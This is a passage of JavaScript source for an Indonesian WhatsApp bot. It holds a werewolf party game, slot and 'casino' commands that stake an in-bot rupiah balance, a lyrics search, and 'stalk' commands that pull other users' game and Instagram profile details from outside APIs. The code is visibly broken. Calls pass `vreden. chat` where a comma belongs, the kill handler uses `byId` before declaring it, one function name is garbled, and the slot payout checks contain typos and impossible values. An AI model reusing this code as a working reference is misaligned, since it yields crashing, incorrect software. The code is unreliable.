        vreden.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(vreden. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(vreden. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(vreden. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${vreden.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await vreden.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${vreden.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await vreden.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${vreden.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await vreden.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${vreden.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await vreden.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${vreden.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await vreden.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await vreden.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(vreden. chat, ww);
    } else      if (value === "kill") { 
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return m.reply("Peran ini bukan untuk kamu"); 
         if (byId.db.role === "sorcerer") 
             return m.reply("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
      reply("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         reply(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") { 
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return m.reply("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return reply("Masukan nomor player");
        if (isNaN(target)) return reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                vreden.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        vreden.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        vreden.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.saluran}`,
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
case 'slot': {
if (!m.isGroup) return warning(mess.OnlyGrup)
if (db.data.users[m.sender].saldo < 2000) return warning(`*Balance Kamu Tidak Cukup Untuk Deposit Slot Sebanyak Rp 2000*`)
db.data.users[m.sender].saldo -= 2000
try {
let _spin1 = await pickRandom(['1', '2', '3', '4', '5']) 
let _spin2 = await pickRandom(['1', '2', '3', '4', '5'])
let _spin3 = await pickRandom(['1', '2', '3', '4', '5'])
let _spin4 = await pickRandom(['1', '2', '3', '4', '5'])
let _spin5 = await pickRandom(['1', '2', '3', '4', '5'])
let _spin6 = await pickRandom(['1', '2', '3', '4', '5'])
let _spin7 = await pickRandom(['1', '2', '3', '4', '5'])
let _spin8 = await pickRandom(['1', '2', '3', '4', '5'])
let _spin9 = await pickRandom(['1', '2', '3', '4', '5'])
let spin1 = (_spin1 * 1)
let spin2 = (_spin2 * 1)
let spin3 = (_spin3 * 1)
let spin4 = (_spin4 * 1)
let spin5 = (_spin5 * 1)
let spin6 = (_spin6 * 1)
let spin7 = (_spin7 * 1)
let spin8 = (_spin8 * 1)
let spin9 = (_spin9 * 1)
let spins1 = (spin1 == 1 ? '🍊' : spin1 == 2 ? '🍇' : spin1 == 3 ? '🍉' : spin1 == 4 ? '🍌' : spin1 == 5 ? '🍍' : '')
let spins2 = (spin2 == 1 ? '🍊' : spin2 == 2 ? '🍇' : spin2 == 3 ? '🍉' : spin2 == 4 ? '🍌' : spin2 == 5 ? '🍍' : '')
let spins3 = (spin3 == 1 ? '🍊' : spin3 == 2 ? '🍇' : spin3 == 3 ? '🍉' : spin3 == 4 ? '🍌' : spin3 == 5 ? '🍍' : '')
let spins4 = (spin4 == 1 ? '🍊' : spin4 == 2 ? '🍇' : spin4 == 3 ? '🍉' : spin4 == 4 ? '🍌' : spin4 == 5 ? '🍍' : '')
let spins5 = (spin5 == 1 ? '🍊' : spin5 == 2 ? '🍇' : spin5 == 3 ? '🍉' : spin5 == 4 ? '🍌' : spin5 == 5 ? '🍍' : '')
let spins6 = (spin6 == 1 ? '🍊' : spin6 == 2 ? '🍇' : spin6 == 3 ? '🍉' : spin6 == 4 ? '🍌' : spin6 == 5 ? '🍍' : '')
let spins7 = (spin7 == 1 ? '🍊' : spin7 == 2 ? '🍇' : spin7 == 3 ? '🍉' : spin7 == 4 ? '🍌' : spin7 == 5 ? '🍍' : '')
let spins8 = (spin8 == 1 ? '🍊' : spin8 == 2 ? '🍇' : spin8 == 3 ? '🍉' : spin8 == 4 ? '🍌' : spin8 == 5 ? '🍍' : '')
let spins9 = (spin9 == 1 ? '🍊' : spin9 == 2 ? '🍇' : spin9 == 3 ? '🍉' : spin9 == 4 ? '🍌' : spin9 == 5 ? '🍍' : '' )
let WinOrLose
if (spin1 == 1 && spin2 == 1 && spin3 == 1 && spin4 == 1 && spin5 == 1 && spin6 == 1 && spin7 == 1 && spin8 == 1 && spin9 == 1 || spin1 == 2 && spin2 == 2 && spin3 == 2 && spin4 == 2 && spin5 == 2 && spin6 == 2 && spin7 == 2 && spin8 == 2 && spin9 == 2 || spin1 == 3 && spin2 == 3 && spin3 == 3 && spin4 == 3 && spin5 == 3 && spin6 == 3 && spin7 == 3 && spin8 == 3 && spin9 == 3 || spin1 == 4 && spin2 == 4 && spin3 == 4 && spin4 == 4 && spin5 == 4 && spin6 == 4 && spin7 == 4 && spin8 == 4 && spin9 == 4 || spin1 == 5 && spin2 == 5 && spin3 == 5 && spin4 == 5 && spin5 == 5 && spin6 == 5 && spin7 == 5 && spin8 == 5 && spin9 == 5) {
db.data.users[m.sender].rank += 250
db.data.users[m.sender].saldo += 10000
WinOrLose = "_*Kamu menang lagi*_\n_*dan mendapatkan*_\n_*Mega Jackpot!*_\n+ 250 Points Rank\n+ Rp 10.000 Saldo"
} else if (spin4 == 1 && spin5 == 1 && spin6 == 1 || spin4 == 2 && spin5 == 2 && spin6 == 2 || spin4 == 3 && spin5 == 3 && spin6 == 3 || spin4 == 4 && spin5 == 4 && spin6 == 4 || spin4 == 5 && spin5 == 5 && spin6 == 5) {
db.data.users[m.sender].rank += 200
db.data.users[m.sender].saldo += 7000
WinOrLose = "_*Kamu menang dan*_\n_*mendapatkan Jackpot!*_\n+ 200 Points Rank\n+ Rp 7.000 Saldo"  
} else if (spin1 == 1 && spin2 == 1 && spin3 == 1 || spin1 == 2 && spin2 == 2 && spin3 == 2 || spin1 == 3 && spin2 == 4 && spin3 == 3 || spin1 == 4 && spin2 == 4 && spin3 == 4 || spin1 == 5 && spin2 == 5 && spin3 == 5 || spin1 == 6 && spin2 == 6 && spin3 == 6 || spin1 == 7 && spin2 == 7 && spin3 == 7 || spin1 == 8 && spin2 == 8 && spin3 == 8 || spin1 == 9 && spin2 == 9 && spin3 == 9) { 
db.data.users[m.sender].rank += 150
db.data.users[m.sender].saldo += 4000
WinOrLose = "_*Kamu menang dalam*_\n_*Pertandingan ini!*_\n+ 150 Points Rank\n+ Rp 4.000 Saldo"
} else {
WinOrLose = "Kamu kalah dalam Pertandingan ini!"
}
var nedd = [
`*── 「 SLOT 」 ──*

🍊 🍌 🍇

_*Rolling...*_`, 
`*── 「 SLOT 」 ──*

🍇 🍉 🍍

_*Rolling...*_`, 
`*── 「 SLOT 」 ──*

🍉 🍇 🍇

_*Rolling...*_`, 
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}

_*Rolling...*_`,
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
🍇 🍉 🍌

_*Rolling...*_`, 
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
🍊 🍇 🍇

_*Rolling...*_`, 
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
🍇 🍍 🍇

_*Rolling...*_`,
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}

_*Rolling...*_`,
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}
🍊 🍍 🍌

_*Rolling...*_`,
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}
🍇 🍇 🍌

_*Rolling...*_`,
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}
🍊 🍌 🍉

_*Rolling...*_`,
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}
${spins7} ${spins8} ${spins9}

_*Rolling...*_`,
`*── 「 SLOT 」 ──*

${spins1} ${spins2} ${spins3}
${spins4} ${spins5} ${spins6}
${spins7} ${spins8} ${spins9}

${WinOrLose}`
]
let { key } = await vreden.sendMessage(m.chat, {text: 'Loading'}, {quoted: bakkk })

for (let i = 0; i < nedd.length; i++) {
await delay(500)
await vreden.sendMessage(m.chat, {text: nedd[i], edit: key });
}
} catch (e) {
m.reply(mess.error.api)
}
}
break
case 'casino':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (db.data.users[m.sender].glimit < 1) return warning(`Limit game kamu sudah habis`)
if (!text) return warning(`Kirim perintah *${prefix+command}* @tag nominal`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (fs.existsSync(`./database/${m.chat}.json`)) return warning(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
if (!args[1]) return warning('Masukan Nominal Nya')
if (args[1].includes('-')) return warning(`Jangan menggunakan -`)
if (isNaN(parseInt(args[1]))) return warning('Nominal Harus Berupa Angka!')
var anu = db.data.users[m.sender].saldo
var ani = db.data.users[users].saldo
if (anu < args[1] || anu == 'undefined') return warning(`Saldo Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}saldo, untuk mengecek Saldo mu!`)
if (ani < args[1] || ani == 'undefined') return warning(`Saldo Lawan Tidak Mencukupi Untuk Bermain Denganmu\nKetik ${prefix}saldo @tag untuk mengecek Saldo lawanmu`)
var casinoo = setCasino(`${m.chat}`)
casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
casinoo.Y = users
casinoo.nominal = parseInt(args[1])
addCountCmd('casino', m.sender, _cmd)
fs.writeFileSync(`./database/casino/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
if (!isCreator && !isPremium) { db.data.users[m.sender].glimit -= 1 }
var starGame = `\n• @${m.sender.replace("@s.whatsapp.net", "")}\n*Menantang ⚔️*\n• ${args[0]}\n\nDengan Nominal: *Rp ${parseInt(args[1])}*\n_${args[0]} Silahkan Pilih Opsi_`
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\"Y\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\"N\"}`
              }
           ]
sendButtonBiasa(m.chat, `*🎰 Memulai Game Casino 💰*`, starGame, button)
}
 db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delcasino':
if (fs.existsSync('./database/casino/'+m.chat+'.json')) {
var csn = JSON.parse(fs.readFileSync('./database/casino/'+m.chat+'.json'))
if (csn.Z.includes(m.sender)) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else if (csn.Y.includes(m.sender)) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else if (isAdmins) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else if (isCreator) {
addCountCmd('delcasino', m.sender, _cmd)
deleteCasino(m.chat)
m.reply('Berhasil Menghapus Sesi Casino')
} else {
m.reply('Anda tidak bisa menghapus sesi casino, karena bukan pemain!')
}
} else {
m.reply('Tidak ada sesi yang berlangsung')
}
db.data.users[m.sender].exp += await randomNomor(20)
break
// Search Menu
case 'lirik': case 'liriklagu':
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *judul*\n\n_Contoh_\n\n${prefix+command} Bila Nanti`)
try {
let result = await fetchJson(`https://widipe.com/lirik?text=${text}`)
let anu = result.result
vreden.sendMessage(m.chat, { image: { url: anu.image }, caption: `*${pj}乂 LIRIK - LAGU${pj}*\n\n*Judul :* ${anu.title}\n*Artis :* ${anu.artist}\n*Lirik :* ${anu.lyrics}\n\n`}, {quoted: m})
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
/*case 'grupwa': case 'searchgrup':
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *nama group*\n\n_Contoh_\n\n${prefix+command} store`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
addCountCmd('grupwa', m.sender, _cmd)
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return warning(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama : ${x.nama}\n*Link :* ${x.link}\n\n`
}
m.reply(teks)
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}).catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
m.reply(`Hasil pencarian dari ${q} tidak ditemukan`)

})WAJIB FIX
break*/
case 'ffstalk': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Contoh: ${prefix+command} id`)
if (isNaN(text)) return warning(`ID harus berupa angka!`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let epep = await fetchJson(`https://api.vreden.my.id/api/ffstalk?id=${text}`)
let caption = `*🗡️FREE FIRE STALK*

*_Akun Info🤺:_*
- ID: ${epep.result.account.id} (REG ${epep.result.account.region})
- Nickname: ${epep.result.account.name}
- Level: ${epep.result.account.level} (${epep.result.account.xp} XP)
- Like: ${epep.result.account.like}
- Create: ${epep.result.account.create_time}
- Last Login: ${epep.result.account.last_login}
- Booyah Pass: ${epep.result.account.booyah_pass}
- Booyah Pass Badge: ${epep.result.account.booyah_pass_badge}
- Equipped Title: ${epep.result.account.equipped_title}
- BR Rank: ${epep.result.account.BR_points}
- CS Rank: ${epep.result.account.CS_points}
- Bio: ${epep.result.account.bio}

*_Pet Info🐈:_*
- Name: ${epep.result.pet_info.name}
- Level: ${epep.result.pet_info.level} (${epep.result.pet_info.xp} XP)
- Jenis: ${epep.result.pet_info.type}

*_Guild Info👥:_*
- ID: ${epep.result.guild.id}
- Name: ${epep.result.guild.name}
- Level: ${epep.result.guild.level}
- Member: ${epep.result.guild.member}
- Capacity: ${epep.result.guild.capacity}

*_Ketua Guild⚔️:_*
- ID: ${epep.result.ketua_guild.id}
- Nickname: ${epep.result.ketua_guild.name}
- Level: ${epep.result.ketua_guild.level} (${epep.result.ketua_guild.xp} XP)
- Like: ${epep.result.ketua_guild.like}
- Create: ${epep.result.ketua_guild.create_time}
- Last Login: ${epep.result.ketua_guild.last_login}
- BR Rank: ${epep.result.ketua_guild.BR_points}
- CS Rank: ${epep.result.ketua_guild.CS_points}

`
balas(caption)
} catch (err) {
m.reply('Username Tidak Ditemukan.')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ffstalk2': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Contoh: ${prefix+command} id`)
if (isNaN(text)) return warning(`ID harus berupa angka!`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let epep = await ffstalk.ffstalk(text)
m.reply(`Id : ${text}
Nickname : ${epep}`)
} catch (err) {
m.reply('Username Tidak Ditemukan.')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'mlstalk': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh: ${prefix+command} idgame idserver`)
if (!args[0]) return warning(`ID harus berupa angka!\n\n*Contoh:*\n${prefix+command} idgame idserver`)
if (!args[1]) return warning(`ID Zone harus berupa angka!\n\n*Contoh:*\n${prefix+command} idgame idserver`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let emel = await mlstalk.mlstalk(args[0], args[1])
balas(`ID : ${args[0]}
ID Zone : ${args[1]}
Nickname : ${emel.userName}`)
} catch {
m.reply('ID/Zona ID tidak ditemukan.')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'igstalk':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!q) return warning(`Contoh: ${prefix+command} nickname`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let anuu = await axios.get(`https://igram.world/api/ig/userInfoByUsername/${text}`, {
            headers: {
                "User-Agent": "PostmanRuntime/7.37.0"
            }
          });
const anu = anuu.data
const nick = anu.result.user.username
const nama = anu.result.user.full_name
const post = await convertAngka(anu.result.user.media_count)
const foll = await convertAngka(anu.result.user.follower_count)
const foli = await convertAngka(anu.result.user.following_count)
const bio = anu.result.user.biography
